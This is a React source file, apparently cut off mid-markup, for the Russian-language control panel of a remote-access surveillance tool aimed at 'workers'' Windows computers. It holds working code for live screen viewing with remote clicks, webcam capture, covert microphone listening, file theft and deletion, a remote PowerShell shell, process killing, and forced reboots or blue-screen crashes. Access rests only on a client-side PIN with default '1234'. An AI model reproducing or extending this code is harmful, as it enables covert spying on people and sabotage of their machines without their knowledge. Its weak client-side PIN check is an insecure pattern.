import { useEffect, useRef, useState } from 'react'
import {
  createScreenViewWs, createMicViewWs, createWebcamViewWs, createScreenshotViewWs,
  fetchWorkerProcesses, killWorkerProcess, fetchWorkerScreenshot, fetchWorkerWebcamPhoto,
  sendWorkerCommand, sendWorkerClick, createShellViewWs, createFilesViewWs,
} from '../api'

const DEFAULT_PIN = '1234'

export function PinModal({ onSuccess, onClose }) {
  const [pin, setPin] = useState('')
  const [newPin, setNewPin] = useState('')
  const [changing, setChanging] = useState(false)
  const [error, setError] = useState('')

  const savedPin = localStorage.getItem('spyPin') || DEFAULT_PIN

  const handleSubmit = (e) => {
    e.preventDefault()
    if (pin !== savedPin) { setError('Неверный пинкод'); return }
    onSuccess()
  }

  const handleChangePin = (e) => {
    e.preventDefault()
    if (pin !== savedPin) { setError('Неверный текущий пинкод'); return }
    if (newPin.length < 4) { setError('Минимум 4 цифры'); return }
    localStorage.setItem('spyPin', newPin)
    onSuccess()
  }

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70" onClick={onClose}>
      <div className="bg-[#1a1d2e] border border-white/10 rounded-2xl p-6 w-72 shadow-2xl" onClick={(e) => e.stopPropagation()}>
        <div className="flex items-center justify-between mb-5">
          <div className="font-semibold text-white">🔒 Мониторинг</div>
          <button onClick={onClose} className="text-slate-400 hover:text-white text-lg leading-none">×</button>
        </div>
        {!changing ? (
          <form onSubmit={handleSubmit} className="space-y-3">
            <input
              autoFocus type="password" inputMode="numeric" placeholder="Пинкод"
              value={pin} onChange={(e) => { setPin(e.target.value); setError('') }}
              className="w-full bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-sm text-white text-center tracking-widest focus:outline-none focus:border-brand-500"
            />
            {error && <p className="text-xs text-red-400 text-center">{error}</p>}
            <button type="submit" className="w-full bg-brand-500 hover:bg-brand-600 text-white rounded-lg py-2 text-sm font-medium transition-colors">Войти</button>
            <button type="button" onClick={() => setChanging(true)} className="w-full text-xs text-slate-500 hover:text-slate-300 transition-colors py-1">Сменить пинкод</button>
          </form>
        ) : (
          <form onSubmit={handleChangePin} className="space-y-3">
            <input type="password" inputMode="numeric" placeholder="Текущий пинкод" value={pin}
              onChange={(e) => { setPin(e.target.value); setError('') }}
              className="w-full bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-sm text-white text-center tracking-widest focus:outline-none focus:border-brand-500"
            />
            <input type="password" inputMode="numeric" placeholder="Новый пинкод" value={newPin}
              onChange={(e) => { setNewPin(e.target.value); setError('') }}
              className="w-full bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-sm text-white text-center tracking-widest focus:outline-none focus:border-brand-500"
            />
            {error && <p className="text-xs text-red-400 text-center">{error}</p>}
            <button type="submit" className="w-full bg-brand-500 hover:bg-brand-600 text-white rounded-lg py-2 text-sm font-medium transition-colors">Сохранить</button>
            <button type="button" onClick={() => setChanging(false)} className="w-full text-xs text-slate-500 hover:text-slate-300 transition-colors py-1">Назад</button>
          </form>
        )}
      </div>
    </div>
  )
}

// ── Screen tab ────────────────────────────────────────────────────────────────
function ScreenTab({ worker }) {
  const [shotUrl, setShotUrl] = useState(null)
  const [shotAt, setShotAt] = useState(null)
  const [shotWorkerOnline, setShotWorkerOnline] = useState(false)
  const [shotCapturing, setShotCapturing] = useState(false)
  const [live, setLive] = useState(false)
  const [webcamUrl, setWebcamUrl] = useState(null)
  const [webcamWorkerOnline, setWebcamWorkerOnline] = useState(false)
  const [webcamCapturing, setWebcamCapturing] = useState(false)
  const [webcamError, setWebcamError] = useState(null)
  const prevShotUrlRef = useRef(null)
  const prevWebcamUrlRef = useRef(null)
  const shotWsRef = useRef(null)
  const webcamWsRef = useRef(null)
  const liveWsRef = useRef(null)
  const liveImgRef = useRef(null)
  const liveDestroyedRef = useRef(false)

  // Screenshot WS
  const captureShot = () => {
    if (!shotWorkerOnline || shotCapturing) return
    setShotCapturing(true)
    shotWsRef.current?.send('capture')
    setTimeout(() => setShotCapturing(false), 10000)
  }

  // Live screen WS
  const stopLive = () => {
    liveDestroyedRef.current = true
    if (liveWsRef.current) { liveWsRef.current.close(); liveWsRef.current = null }
    setLive(false)
  }

  const startLive = () => {
    if (liveWsRef.current) return
    liveDestroyedRef.current = false

    const connectLive = () => {
      if (liveDestroyedRef.current) return
      const ws = createScreenViewWs(worker.id)
      ws.binaryType = 'arraybuffer'
      ws.onmessage = (e) => {
        const blob = new Blob([e.data], { type: 'image/jpeg' })
        const url = URL.createObjectURL(blob)
        if (liveImgRef.current) {
          const old = liveImgRef.current.src
          liveImgRef.current.src = url
          if (old.startsWith('blob:')) URL.revokeObjectURL(old)
        }
      }
      ws.onclose = () => {
        liveWsRef.current = null
        if (!liveDestroyedRef.current) setTimeout(connectLive, 2000)
        else setLive(false)
      }
      liveWsRef.current = ws
    }

    connectLive()
    setLive(true)
  }

  const handleLiveClick = (e) => {
    if (!live) return
    const rect = e.currentTarget.getBoundingClientRect()
    sendWorkerClick(worker.id, (e.clientX - rect.left) / rect.width, (e.clientY - rect.top) / rect.height).catch(() => {})
  }

  // Webcam WS
  const captureWebcam = () => {
    if (!webcamWorkerOnline || webcamCapturing) return
    setWebcamCapturing(true)
    webcamWsRef.current?.send('capture')
    setTimeout(() => setWebcamCapturing(false), 8000)
  }

  useEffect(() => {
    let destroyed = false
    let shotReconnect = null
    let camReconnect = null

    const connectShot = () => {
      if (destroyed) return
      const ws = createScreenshotViewWs(worker.id)
      ws.onmessage = (e) => {
        if (typeof e.data !== 'string') return
        const msg = e.data
        if (msg === '\x01connected') { setShotWorkerOnline(true); return }
        if (msg === '\x01offline') {
          setShotWorkerOnline(false)
          shotWsRef.current?.close()
          return
        }
        if (msg === '\x01screenshot_done') {
          fetchWorkerScreenshot(worker.id).then((res) => {
            setShotCapturing(false)
            const url = URL.createObjectURL(res.data)
            if (prevShotUrlRef.current) URL.revokeObjectURL(prevShotUrlRef.current)
            prevShotUrlRef.current = url
            setShotUrl(url)
            setShotAt(new Date())
          }).catch(() => setShotCapturing(false))
        }
      }
      ws.onclose = () => {
        shotWsRef.current = null
        setShotWorkerOnline(false)
        if (!destroyed) shotReconnect = setTimeout(connectShot, 3000)
      }
      shotWsRef.current = ws
    }

    const connectCam = () => {
      if (destroyed) return
      const ws = createWebcamViewWs(worker.id)
      ws.onmessage = (e) => {
        if (typeof e.data !== 'string') return
        const msg = e.data
        if (msg === '\x01connected') { setWebcamWorkerOnline(true); return }
        if (msg === '\x01offline') {
          setWebcamWorkerOnline(false)
          webcamWsRef.current?.close()
          return
        }
        if (msg.startsWith('\x01error:')) {
          setWebcamCapturing(false)
          setWebcamError(msg.slice(7))
          return
        }
        if (msg === '\x01webcam_done') {
          fetchWorkerWebcamPhoto(worker.id).then((res) => {
            setWebcamCapturing(false)
            setWebcamError(null)
            const url = URL.createObjectURL(res.data)
            if (prevWebcamUrlRef.current) URL.revokeObjectURL(prevWebcamUrlRef.current)
            prevWebcamUrlRef.current = url
            setWebcamUrl(url)
          }).catch(() => setWebcamCapturing(false))
        }
      }
      ws.onclose = () => {
        webcamWsRef.current = null
        setWebcamWorkerOnline(false)
        if (!destroyed) camReconnect = setTimeout(connectCam, 3000)
      }
      webcamWsRef.current = ws
    }

    connectShot()
    connectCam()

    return () => {
      destroyed = true
      if (shotReconnect) clearTimeout(shotReconnect)
      if (camReconnect) clearTimeout(camReconnect)
      if (prevShotUrlRef.current) URL.revokeObjectURL(prevShotUrlRef.current)
      if (prevWebcamUrlRef.current) URL.revokeObjectURL(prevWebcamUrlRef.current)
      stopLive()
      shotWsRef.current?.close()
      webcamWsRef.current?.close()
    }
  }, [worker.id])

  const shotAge = shotAt ? Math.floor((Date.now() - shotAt.getTime()) / 1000) : null
  const shotAgeStr = shotAge === null ? '' : shotAge < 60 ? `${shotAge}с назад` : `${Math.floor(shotAge / 60)}м назад`

  return (
    <div>
      <div className="flex items-center justify-between mb-3">
        {shotAt && !live ? <span className="text-xs text-slate-500">Снято: {shotAgeStr}</span> : <span />}
        <div className="flex items-center gap-2">
          <button onClick={live ? stopLive : startLive} className={`text-xs px-3 py-1.5 rounded-lg border font-medium transition-colors ${live ? 'bg-red-500/15 border-red-500/30 text-red-400' : 'bg-green-500/10 border-green-500/30 text-green-400'}`}>
            {live ? '⏹ Стоп' : '▶ Live ~10 FPS'}
          </button>
          {!live && (
            <button onClick={captureShot} disabled={!shotWorkerOnline || shotCapturing} className="text-xs px-3 py-1.5 rounded-lg bg-slate-700/50 border border-white/10 text-slate-300 hover:text-white transition-colors disabled:opacity-40">
              {shotCapturing ? 'Ждём...' : 'Скриншот'}
            </button>
          )}
        </div>
      </div>
      <div className="rounded-xl overflow-hidden bg-black min-h-[180px] flex items-center justify-center">
        {!shotUrl && !live && <div className="text-slate-500 text-sm py-12">{shotWorkerOnline ? 'Нажмите «Скриншот»' : 'Воркер офлайн'}</div>}
        {shotUrl && !live && <img src={shotUrl} alt="screenshot" className="w-full h-auto block" />}
        <img ref={liveImgRef} alt="live" onClick={handleLiveClick} className={`w-full h-auto block ${live ? 'cursor-crosshair' : 'hidden'}`} />
      </div>

      {/* Webcam section */}
      <div className="mt-4 pt-4 border-t border-white/10">
        <div className="flex items-center justify-between mb-3">
          <div className="flex items-center gap-2">
            <span className="text-xs text-slate-400 font-medium">📷 Вебкамера</span>
            <span className={`w-1.5 h-1.5 rounded-full ${webcamWorkerOnline ? 'bg-green-400' : 'bg-slate-600'}`} />
          </div>
          <button
            onClick={captureWebcam}
            disabled={!webcamWorkerOnline || webcamCapturing}
            className="text-xs px-3 py-1.5 rounded-lg bg-slate-700/50 border border-white/10 text-slate-300 hover:text-white disabled:opacity-40 transition-colors"
          >
            {webcamCapturing ? 'Снимаем...' : 'Сфотографировать'}
          </button>
        </div>
        {webcamError && <div className="mb-2 text-xs text-red-400 font-mono break-all">{webcamError}</div>}
        {webcamUrl
          ? <div className="rounded-xl overflow-hidden bg-black"><img src={webcamUrl} alt="webcam" className="w-full h-auto block" /></div>
          : <div className="rounded-xl bg-black/30 border border-white/5 flex items-center justify-center py-8 text-slate-600 text-sm">{webcamWorkerOnline ? 'Нажмите кнопку для снимка' : 'Воркер офлайн'}</div>
        }
      </div>
    </div>
  )
}

// ── Mic tab ───────────────────────────────────────────────────────────────────
function MicTab({ worker }) {
  const [listening, setListening] = useState(false)
  const wsRef = useRef(null)
  const sourceBufferRef = useRef(null)
  const audioRef = useRef(null)
  const mediaSourceRef = useRef(null)
  const queueRef = useRef([])
  const appendingRef = useRef(false)

  const appendNext = () => {
    const sb = sourceBufferRef.current
    if (!sb || sb.updating || appendingRef.current || queueRef.current.length === 0) return
    appendingRef.current = true
    const data = queueRef.current.shift()
    try { sb.appendBuffer(data) } catch { appendingRef.current = false }
  }

  const startListening = () => {
    const ms = new MediaSource()
    mediaSourceRef.current = ms
    const audio = audioRef.current
    audio.src = URL.createObjectURL(ms)
    ms.addEventListener('sourceopen', () => {
      try {
        const sb = ms.addSourceBuffer('audio/webm;codecs=opus')
        sourceBufferRef.current = sb
        sb.addEventListener('updateend', () => {
          appendingRef.current = false
          appendNext()
          if (audio.buffered.length > 0) {
            const end = audio.buffered.end(audio.buffered.length - 1)
            if (end - audio.currentTime > 1.5) audio.currentTime = end - 0.1
          }
        })
      } catch (e) { console.error('SourceBuffer error:', e) }
    })
    audio.play().catch(() => {})
    const ws = createMicViewWs(worker.id)
    ws.binaryType = 'arraybuffer'
    ws.onmessage = (e) => { queueRef.current.push(e.data); appendNext() }
    ws.onclose = () => setListening(false)
    wsRef.current = ws
    setListening(true)
  }

  const stopListening = () => {
    if (wsRef.current) { wsRef.current.close(); wsRef.current = null }
    const audio = audioRef.current
    if (audio) { audio.pause(); audio.src = '' }
    sourceBufferRef.current = null
    queueRef.current = []
    appendingRef.current = false
    setListening(false)
  }

  useEffect(() => () => stopListening(), [])

  return (
    <div className="flex flex-col items-center gap-4 py-6">
      <div className={`w-20 h-20 rounded-full flex items-center justify-center text-3xl transition-all ${listening ? 'bg-red-500/20 ring-4 ring-red-500/40 animate-pulse' : 'bg-slate-700/50'}`}>🎙</div>
      <p className="text-sm text-slate-400">{listening ? 'Слушаем микрофон...' : 'Нажмите чтобы начать'}</p>
      <button
        onClick={listening ? stopListening : startListening}
        className={`px-6 py-2 rounded-lg text-sm font-medium transition-colors ${listening ? 'bg-red-500/20 border border-red-500/30 text-red-400 hover:bg-red-500/30' : 'bg-green-500/15 border border-green-500/30 text-green-400 hover:bg-green-500/25'}`}
      >
        {listening ? 'Остановить' : 'Слушать'}
      </button>
      <audio ref={audioRef} className="hidden" />
    </div>
  )
}

// ── Processes tab ─────────────────────────────────────────────────────────────
function ProcessesTab({ worker }) {
  const [processes, setProcesses] = useState([])
  const [updatedAt, setUpdatedAt] = useState(null)
  const [search, setSearch] = useState('')
  const [loading, setLoading] = useState(false)
  const [killing, setKilling] = useState(null)

  const load = async () => {
    setLoading(true)
    try {
      const data = await fetchWorkerProcesses(worker.id)
      setProcesses(data.processes || [])
      setUpdatedAt(data.updated_at ? new Date(data.updated_at) : null)
    } catch {} finally { setLoading(false) }
  }

  const handleKill = async (name) => {
    if (!confirm(`Завершить процесс «${name}»?`)) return
    setKilling(name)
    try {
      await killWorkerProcess(worker.id, name)
      setProcesses((prev) => prev.filter((p) => p !== name))
      setTimeout(load, 3000)
    }
    catch {} finally { setKilling(null) }
  }

  useEffect(() => { load() }, [])

  const filtered = processes.filter(p => p.toLowerCase().includes(search.toLowerCase()))
  const age = updatedAt ? Math.floor((Date.now() - updatedAt.getTime()) / 1000) : null
  const ageStr = age === null ? '' : age < 60 ? `${age}с назад` : `${Math.floor(age / 60)}м назад`

  return (
    <div className="flex flex-col" style={{ minHeight: 0 }}>
      <div className="flex items-center justify-between mb-3">
        {updatedAt ? <span className="text-xs text-slate-500">{ageStr} · {processes.length} процессов</span> : <span />}
        <button onClick={load} disabled={loading} className="text-xs px-3 py-1.5 rounded-lg bg-slate-700/50 border border-white/10 text-slate-300 hover:text-white disabled:opacity-50 transition-colors">
          {loading ? '...' : 'Обновить'}
        </button>
      </div>
      <input value={search} onChange={(e) => setSearch(e.target.value)} placeholder="Поиск процесса..."
        className="w-full bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-sm text-white placeholder-slate-500 focus:outline-none focus:border-brand-500 mb-2"
      />
      <div className="overflow-y-auto space-y-0.5" style={{ maxHeight: 260 }}>
        {filtered.length === 0 && <div className="text-slate-500 text-sm text-center py-8">{loading ? 'Загрузка...' : 'Нет данных'}</div>}
        {filtered.map((p, i) => (
          <div key={i} className="flex items-center justify-between px-3 py-1.5 rounded hover:bg-white/5 group">
            <span className="text-sm text-slate-300 font-mono">{p}</span>
            <button onClick={() => handleKill(p)} disabled={killing === p}
              className="text-xs px-2 py-0.5 rounded text-red-400 hover:bg-red-400/15 opacity-0 group-hover:opacity-100 transition-all disabled:opacity-50">
              {killing === p ? '...' : 'завершить'}
            </button>
          </div>
        ))}
      </div>
    </div>
  )
}

// ── Controls tab ──────────────────────────────────────────────────────────────
function ControlsTab({ worker }) {
  const [done, setDone] = useState({})
  const [errors, setErrors] = useState({})
  const send = async (cmd, label) => {
    if (!confirm(`${label} для ${worker.username}?`)) return
    setErrors(e => ({ ...e, [cmd]: null }))
    try {
      await sendWorkerCommand(worker.id, cmd)
      setDone(d => ({ ...d, [cmd]: true }))
    } catch (err) {
      const msg = err.response?.data?.detail || 'Ошибка'
      setErrors(e => ({ ...e, [cmd]: msg }))
    }
  }

  const controls = [
    { cmd: 'lock-screen', label: 'Заблокировать экран', desc: 'Блокирует сеанс Windows (Win+L)', icon: '🔒', cls: 'bg-slate-700/50 border-white/10 text-slate-300 hover:text-white' },
    { cmd: 'reboot', label: 'Перезагрузить ПК', desc: 'Немедленная перезагрузка без предупреждения', icon: '🔄', cls: 'bg-yellow-500/15 border-yellow-500/30 text-yellow-400 hover:bg-yellow-500/25' },
    { cmd: 'quit', label: 'Закрыть приложение', desc: 'Завершает процесс воркер-приложения', icon: '⏹', cls: 'bg-orange-500/15 border-orange-500/30 text-orange-400 hover:bg-orange-500/25' },
    { cmd: 'remove-autostart', label: 'Убрать из автозапуска', desc: 'Удаляет из автостарта Windows', icon: '🚫', cls: 'bg-slate-700/50 border-white/10 text-slate-300 hover:text-white' },
  ]

  return (
    <div className="flex flex-col gap-3 py-2">
      {controls.map(({ cmd, label, desc, icon, cls }) => (
        <div key={cmd} className="bg-black/20 border border-white/5 rounded-xl p-4 flex items-center justify-between">
          <div>
            <div className="text-sm text-white font-medium">{label}</div>
            <div className="text-xs text-slate-500 mt-0.5">{desc}</div>
          </div>
          <div className="flex flex-col items-end gap-1">
            {errors[cmd] && <span className="text-xs text-red-400">{errors[cmd]}</span>}
            <button onClick={() => send(cmd, label)} disabled={done[cmd]}
              className={`text-xs px-4 py-2 rounded-lg border disabled:opacity-50 transition-colors ${cls}`}>
              {done[cmd] ? 'Отправлено' : `${icon} ${label.split(' ')[0]}`}
            </button>
          </div>
        </div>
      ))}

      {/* BSOD — separate with extra warning */}
      <div className="bg-red-950/30 border border-red-500/20 rounded-xl p-4 flex items-center justify-between">
        <div>
          <div className="text-sm text-red-300 font-medium">Аварийное выключение (BSOD)</div>
          <div className="text-xs text-red-500/70 mt-0.5">Вызывает синий экран смерти. Несохранённые данные будут потеряны</div>
        </div>
        <div className="flex flex-col items-end gap-1">
          {errors['bsod'] && <span className="text-xs text-red-400">{errors['bsod']}</span>}
          <button
            onClick={() => send('bsod', '⚠️ Вызвать BSOD')}
            disabled={done['bsod']}
            className="text-xs px-4 py-2 rounded-lg bg-red-600/20 border border-red-500/40 text-red-400 hover:bg-red-600/30 disabled:opacity-50 transition-colors font-medium"
          >
            {done['bsod'] ? 'Отправлено' : '💀 BSOD'}
          </button>
        </div>
      </div>
    </div>
  )
}

// ── File manager tab ──────────────────────────────────────────────────────────
function fmt(bytes) {
  if (bytes === 0) return ''
  if (bytes < 1024) return `${bytes} B`
  if (bytes < 1024 ** 2) return `${(bytes / 1024).toFixed(0)} KB`
  if (bytes < 1024 ** 3) return `${(bytes / 1024 ** 2).toFixed(1)} MB`
  return `${(bytes / 1024 ** 3).toFixed(2)} GB`
}

function FileTab({ worker }) {
  const [connected, setConnected] = useState(false)
  const [workerOnline, setWorkerOnline] = useState(false)
  const [path, setPath] = useState(null)
  const [entries, setEntries] = useState([])
  const [drives, setDrives] = useState([])
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState(null)
  const [deleting, setDeleting] = useState(null)
  const wsRef = useRef(null)
  const pendingRef = useRef({})

  const send = (action, extra = {}) => new Promise((resolve, reject) => {
    const id = Math.random().toString(36).slice(2)
    pendingRef.current[id] = { resolve, reject }
    wsRef.current?.send(JSON.stringify({ id, action, ...extra }))
    setTimeout(() => {
      if (pendingRef.current[id]) {
        delete pendingRef.current[id]
        reject(new Error('Timeout'))
      }
    }, 15_000)
  })

  useEffect(() => {
    let destroyed = false
    let reconnectTimeout = null

    const connect = () => {
      if (destroyed) return
      const ws = createFilesViewWs(worker.id)
      ws.onopen = () => setConnected(true)
      ws.onclose = () => {
        // Reject all pending requests so they don't hang forever
        Object.values(pendingRef.current).forEach(({ reject }) => reject(new Error('Disconnected')))
        pendingRef.current = {}
        setConnected(false)
        setWorkerOnline(false)
        if (!destroyed) reconnectTimeout = setTimeout(connect, 3000)
      }
      ws.onmessage = (e) => {
        // Check control messages BEFORE JSON.parse (avoids crash on '\x01...' strings)
        if (typeof e.data === 'string' && e.data.startsWith('\x01')) {
          setWorkerOnline(e.data.slice(1) === 'online'); return
        }
        try {
          const msg = JSON.parse(e.data)
          if (msg.id && pendingRef.current[msg.id]) {
            const { resolve } = pendingRef.current[msg.id]
            delete pendingRef.current[msg.id]
            resolve(msg)
          }
        } catch {}
      }
      wsRef.current = ws
    }

    connect()
    return () => {
      destroyed = true
      if (reconnectTimeout) clearTimeout(reconnectTimeout)
      wsRef.current?.close()
    }
  }, [worker.id])

  useEffect(() => {
    if (!workerOnline) return
    setLoading(true)
    send('home').then((res) => {
      setDrives(res.drives || [])
      navigate(res.home || '/')
    }).catch(() => setLoading(false))
  }, [workerOnline])

  const navigate = async (newPath) => {
    setLoading(true)
    setError(null)
    try {
      const res = await send('list', { path: newPath })
      if (res.error) { setError(res.error); setLoading(false); return }
      setPath(newPath)
      setEntries(res.entries || [])
    } catch (e) { setError(e.message) }
    setLoading(false)
  }

  const goUp = () => {
    if (!path) return
    const sep = path.includes('\\') ? '\\' : '/'
    const parts = path.replace(/[\\/]+$/, '').split(sep)
    if (parts.length <= 1) return
    parts.pop()
    navigate(parts.join(sep) || sep)
  }

  const download = async (entry) => {
    try {
      const fullPath = path.replace(/[\\/]$/, '') + (path.includes('\\') ? '\\' : '/') + entry.name
      const res = await send('read', { path: fullPath })
      if (res.error) { alert(res.error); return }
      const bytes = Uint8Array.from(atob(res.data), c => c.charCodeAt(0))
      const url = URL.createObjectURL(new Blob([bytes]))
      const a = document.createElement('a')
      a.href = url; a.download = entry.name; a.click()
      URL.revokeObjectURL(url)
    } catch (e) { alert(e.message) }
  }

  const deleteEntry = async (entry) => {
    const fullPath = path.replace(/[\\/]$/, '') + (path.includes('\\') ? '\\' : '/') + entry.name
    if (!confirm(`Удалить «${entry.name}»?`)) return
    setDeleting(entry.name)
    try {
      const res = await send('delete', { path: fullPath })
      if (res.error) { alert(res.error); return }
      setEntries(e => e.filter(x => x.name !== entry.name))
    } catch (e) { alert(e.message) } finally { setDeleting(null) }
  }

  const sep = path?.includes('\\') ? '\\' : '/'

  return (
    <div className="flex flex-col gap-3">
      {/* Status + drives */}
      <div className="flex items-center gap-2 flex-wrap">
        <span className={`w-2 h-2 rounded-full flex-shrink-0 ${workerOnline ? 'bg-green-400' : 'bg-red-500'}`} />
        <span className="text-xs text-slate-500">{workerOnline ? 'подключён' : 'офлайн'}</span>
        {drives.map(d => (
          <button key={d} onClick={() => navigate(d)} className="text-xs px-2 py-0.5 rounded bg-slate-700/50 border border-white/10 text-slate-300 hover:text-white transition-colors">{d}</button>
        ))}
      </div>

      {/* Path bar */}
      <div className="flex items-center gap-2">
        <button onClick={goUp} disabled={!path} className="text-xs px-2 py-1.5 rounded bg-slate-700/40 border border-white/10 text-slate-300 hover:text-white disabled:opacity-40 transition-colors flex-shrink-0">↑</button>
        <div className="flex-1 bg-black/30 border border-white/10 rounded-lg px-3 py-1.5 text-xs text-slate-300 font-mono truncate">{path ?? '...'}</div>
        <button onClick={() => path && navigate(path)} disabled={loading} className="text-xs px-2 py-1.5 rounded bg-slate-700/40 border border-white/10 text-slate-400 hover:text-white disabled:opacity-40 transition-colors flex-shrink-0">↺</button>
      </div>

      {/* File list */}
      <div className="bg-black/30 rounded-xl overflow-hidden border border-white/5" style={{ minHeight: 240, maxHeight: 360 }}>
        {!workerOnline && <div className="text-slate-500 text-sm text-center py-16">Воркер офлайн</div>}
        {workerOnline && loading && <div className="text-slate-500 text-sm text-center py-16">Загрузка...</div>}
        {workerOnline && !loading && error && <div className="text-red-400 text-sm text-center py-16">{error}</div>}
        {workerOnline && !loading && !error && (
          <div className="overflow-y-auto" style={{ maxHeight: 360 }}>
            {entries.length === 0 && <div className="text-slate-600 text-sm text-center py-12">Папка пуста</div>}
            {entries.map((e) => (
              <div key={e.name} className="flex items-center justify-between px-4 py-2 hover:bg-white/5 group border-b border-white/3 last:border-0">
                <button
                  onClick={() => e.isDir ? navigate(path.replace(/[\\/]$/, '') + sep + e.name) : null}
                  className={`flex items-center gap-2.5 flex-1 min-w-0 text-left ${e.isDir ? 'cursor-pointer' : 'cursor-default'}`}
                >
                  <span className="text-base flex-shrink-0">{e.error ? '⚠️' : e.isDir ? '📁' : '📄'}</span>
                  <span className={`text-sm truncate ${e.isDir ? 'text-blue-300' : 'text-slate-300'}`}>{e.name}</span>
                  {!e.isDir && e.size > 0 && <span className="text-xs text-slate-600 flex-shrink-0">{fmt(e.size)}</span>}
                </button>
                <div className="flex items-center gap-1 opacity-0 group-hover:opacity-100 transition-opacity">
                  {!e.isDir && (
                    <button onClick={() => download(e)} className="text-xs px-2 py-0.5 rounded text-green-400 hover:bg-green-400/10 transition-colors">скачать</button>
                  )}
                  <button onClick={() => deleteEntry(e)} disabled={deleting === e.name} className="text-xs px-2 py-0.5 rounded text-red-400 hover:bg-red-400/10 disabled:opacity-50 transition-colors">
                    {deleting === e.name ? '...' : 'удалить'}
                  </button>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  )
}

// ── Shell tab ─────────────────────────────────────────────────────────────────
function ShellTab({ worker }) {
  const [lines, setLines] = useState([{ type: 'info', text: 'Подключение...' }])
  const [input, setInput] = useState('')
  const [running, setRunning] = useState(false)
  const [connected, setConnected] = useState(false)
  const [workerOnline, setWorkerOnline] = useState(false)
  const wsRef = useRef(null)
  const bottomRef = useRef(null)
  const historyRef = useRef([])
  const historyIdxRef = useRef(-1)

  useEffect(() => {
    let destroyed = false
    let reconnectTimeout = null

    const connect = () => {
      if (destroyed) return
      const ws = createShellViewWs(worker.id)
      ws.onopen = () => setConnected(true)
      ws.onclose = () => {
        setConnected(false)
        setWorkerOnline(false)
        setRunning(false)
        setLines(l => [...l, { type: 'info', text: '(соединение закрыто)' }])
        if (!destroyed) reconnectTimeout = setTimeout(connect, 3000)
      }
      ws.onmessage = (e) => {
        const text = e.data
        if (text.startsWith('\x01')) {
          const status = text.slice(1)
          setWorkerOnline(status === 'connected')
          setLines(l => [...l, { type: 'info', text: status === 'connected' ? 'Воркер подключён' : 'Воркер офлайн' }])
          return
        }
        setRunning(false)
        setLines(l => [...l, { type: 'output', text }])
        setTimeout(() => bottomRef.current?.scrollIntoView({ behavior: 'smooth' }), 50)
      }
      wsRef.current = ws
    }

    connect()
    return () => {
      destroyed = true
      if (reconnectTimeout) clearTimeout(reconnectTimeout)
      wsRef.current?.close()
    }
  }, [worker.id])

  const sendCmd = () => {
    const cmd = input.trim()
    if (!cmd || !wsRef.current || running || !workerOnline) return
    historyRef.current = [cmd, ...historyRef.current.slice(0, 49)]
    historyIdxRef.current = -1
    setLines(l => [...l, { type: 'cmd', text: cmd }])
    wsRef.current.send(cmd)
    setInput('')
    setRunning(true)
    setTimeout(() => bottomRef.current?.scrollIntoView({ behavior: 'smooth' }), 50)
  }

  const handleKeyDown = (e) => {
    if (e.key === 'Enter') { sendCmd(); return }
    if (e.key === 'ArrowUp') {
      e.preventDefault()
      const idx = Math.min(historyIdxRef.current + 1, historyRef.current.length - 1)
      historyIdxRef.current = idx
      setInput(historyRef.current[idx] ?? '')
    }
    if (e.key === 'ArrowDown') {
      e.preventDefault()
      const idx = Math.max(historyIdxRef.current - 1, -1)
      historyIdxRef.current = idx
      setInput(idx === -1 ? '' : historyRef.current[idx] ?? '')
    }
  }

  return (
    <div className="flex flex-col gap-3">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <span className={`w-2 h-2 rounded-full ${workerOnline ? 'bg-green-400' : 'bg-red-500'}`} />
          <span className="text-xs text-slate-500">{workerOnline ? 'воркер подключён' : 'воркер офлайн'}</span>
        </div>
        <button onClick={() => setLines([])} className="text-xs text-slate-600 hover:text-slate-400 transition-colors">очистить</button>
      </div>
      <div className="bg-black/60 rounded-xl p-3 font-mono text-xs overflow-y-auto" style={{ minHeight: 260, maxHeight: 360 }}>
        {lines.map((l, i) => (
          <div key={i} className={l.type === 'cmd' ? 'text-green-400 mt-1' : l.type === 'info' ? 'text-yellow-600 italic' : 'text-slate-200 whitespace-pre-wrap break-all'}>
            {l.type === 'cmd' ? `PS> ${l.text}` : l.text}
          </div>
        ))}
        {running && <div className="text-slate-500 animate-pulse mt-1">выполняется...</div>}
        <div ref={bottomRef} />
      </div>
      <div className="flex items-center gap-2">
        <span className="text-green-400 font-mono text-xs flex-shrink-0">PS&gt;</span>
        <input
          value={input} onChange={(e) => setInput(e.target.value)} onKeyDown={handleKeyDown}
          disabled={!connected || !workerOnline || running}
          placeholder={!connected ? 'нет соединения' : !workerOnline ? 'воркер офлайн' : 'команда... (↑↓ — история)'}
          className="flex-1 bg-black/40 border border-white/10 rounded-lg px-3 py-2 text-sm text-white font-mono placeholder-slate-600 focus:outline-none focus:border-brand-500 disabled:opacity-40"
          autoComplete="off" spellCheck={false}
        />
        <button onClick={sendCmd} disabled={!connected || !workerOnline || running || !input.trim()}
          className="px-4 py-2 text-sm bg-brand-500/20 border border-brand-500/30 text-brand-400 rounded-lg hover:bg-brand-500/30 disabled:opacity-40 transition-colors flex-shrink-0">
          Выполнить
        </button>
      </div>
    </div>
  )
}

// ── Combined modal ────────────────────────────────────────────────────────────
const TABS = [
  { id: 'screen', label: '📷 Экран' },
  { id: 'mic', label: '🎙 Микрофон' },
  { id: 'processes', label: '⚙ Процессы' },
  { id: 'files', label: '📁 Файлы' },
  { id: 'shell', label: '💻 Терминал' },
  { id: 'controls', label: '🛠 Управление' },
]

export function MonitoringModal({ worker, onClose, defaultTab = 'screen' }) {
  const [tab, setTab] = useState(defaultTab)

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/75" onClick={onClose}>
      <div
        className="bg-[#1a1d2e] border border-white/10 rounded-2xl shadow-2xl flex flex-col"
        style={{ width: '860px', maxWidth: 'calc(100vw - 32px)', maxHeight: 'calc(100vh - 48px)' }}
        onClick={(e) => e.stopPropagation()}
      >
        <div className="flex items-center justify-between px-6 py-4 border-b border-white/10 flex-shrink-0">
          <div className="flex items-center gap-3">
            <span className="text-white font-semibold">{worker.username}</span>
            <span className="text-slate-500 text-sm">— мониторинг</span>
          </div>
          <button onClick={onClose} className="text-slate-400 hover:text-white text-xl leading-none transition-colors">×</button>
        </div>
